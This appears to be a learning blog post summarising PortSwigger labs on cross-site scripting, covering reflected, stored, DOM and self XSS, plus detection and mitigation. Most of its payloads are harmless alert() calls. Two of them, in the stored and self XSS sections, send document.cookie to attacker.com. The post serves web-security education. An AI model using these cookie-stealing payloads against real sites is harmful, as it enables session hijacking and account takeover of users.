---
title: "Understanding Cross-Site Scripting (XSS) - OWASP Top 10 & PortSwigger Labs"
date: 2025-07-24
layout: post
tags: [owasp, xss, web-security, portswigger]
---

<div style="background-color: #f9f9f9; padding: 20px; border-left: 5px solid #007acc; border-radius: 6px; margin-bottom: 20px;">

<strong> Table of Contents</strong>

<ul>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#what-is-xss">What is Cross-Site Scripting (XSS)?</a></li>
  <li><a href="#why-xss-is-dangerous">Why XSS is Dangerous?</a></li>
  <li><a href="#1-reflected-xss">1. Reflected XSS</a></li>
  <li><a href="#2-stored-xss">2. Stored XSS</a></li>
  <li><a href="#3-dom-based-xss">3. DOM-Based XSS</a></li>
  <li><a href="#4-self-xss">4. Self XSS</a></li>
  <li><a href="#detection">Detection Techniques</a></li>
  <li><a href="#mitigation-and-prevention">Mitigation and Prevention</a></li>
  <li><a href="#summary">Summary</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#references">References</a></li>
</ul>

</div>

## Introduction

Cross-Site Scripting (XSS) is one of the most prevalent and dangerous vulnerabilities in modern web applications, listed in the OWASP Top 10. XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. This can lead to stolen cookies, session hijacking, defacement, and even full account takeover.

This blog summarizes what I’ve learned from the **PortSwigger Web Security Academy**, covering different types of XSS, real-world payloads, lab examples, and how to prevent them.

## What is Cross-Site Scripting (XSS)?

XSS is a client-side code injection attack that enables attackers to execute malicious scripts in the browser of a victim by injecting them into trusted websites.

**Basic payload example:**

```html
<script>alert('XSS')</script>
```

If user input isn’t sanitized or escaped properly, this payload can be executed in the victim's browser.

## Why XSS is Dangerous?

- **Stealing session cookies**
- **Impersonating users**
- **Performing actions on behalf of others**
- **Phishing via spoofed login forms**
- **Defacing websites**
- **Pivoting into internal systems**

## 1. Reflected XSS

### How it works:

Occurs when user input is immediately returned by the server in the HTTP response without proper validation or escaping.

### Example Payload:

```html
"><script>alert('Reflected XSS')</script>
```

### Example URL:

```
https://example.com/search?q="><script>alert('XSS')</script>
```

<div style="text-align: center;">
  <img src="/top10-owasp-blog/assets/images/xss-reflected.png" alt="Reflected XSS" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
  <p><em>Figure 1: Reflected XSS attack flow</em></p>
</div>

## 2. Stored XSS

### How it works:

Stored (or persistent) XSS occurs when the malicious script is saved on the server (e.g., in a database) and served to users later.

### Example Payload:

```html
<script>fetch('https://attacker.com?c='+document.cookie)</script>
```

<div style="text-align: center;">
  <img src="/top10-owasp-blog/assets/images/xss-stored.png" alt="Stored XSS" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
  <p><em>Figure 2: Stored XSS workflow</em></p>
</div>

## 3. DOM-Based XSS

### How it works:

DOM XSS happens entirely on the client side. The browser-side script uses unsanitized input to modify the DOM, allowing XSS execution.

### Example:

```javascript
let search = location.hash.substring(1);
document.getElementById("output").innerHTML = search;
```

With URL:

```
https://example.com/#<script>alert('DOM XSS')</script>
```

The script executes in the browser without server involvement.

## 4. Self XSS

### How it works:

An attacker convinces users to run a malicious script in their own browser console. It relies on social engineering and does not exploit a server-side vulnerability.

### Common Payload:

```javascript
javascript:fetch('https://attacker.com?cookie='+document.cookie)
```

## Detection Techniques

- Use **Burp Suite** or **ZAP Scanner**
- Manually test for reflected parameters
- Inject harmless payloads like `<img src=x onerror=alert(1)>`
- Review DOM code for unsafe assignments
- Tools: **Dalfox**, **XSStrike**, **XSS Hunter**

## Mitigation and Prevention

- **Escape output** according to context (HTML, JavaScript, URL)
- Use **Content Security Policy (CSP)**
- Use **frameworks that auto-sanitize** (React, Angular)
- Set **HTTPOnly** on cookies
- Use **input validation & output encoding**
- Disable inline scripts using CSP
- Avoid `innerHTML`, `document.write()`, `eval()`


## Conclusion

XSS vulnerabilities are still widespread and extremely dangerous. By practicing with **PortSwigger Labs**, I gained hands-on knowledge on how these attacks are crafted and how to defend against them. Developers must always sanitize user input, escape output, and adopt modern frameworks and browser policies to minimize exposure.

## References

- [PortSwigger Academy: XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Guide](https://owasp.org/www-community/xss)
- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Google Web Fundamentals: CSP](https://developers.google.com/web/fundamentals/security/csp)
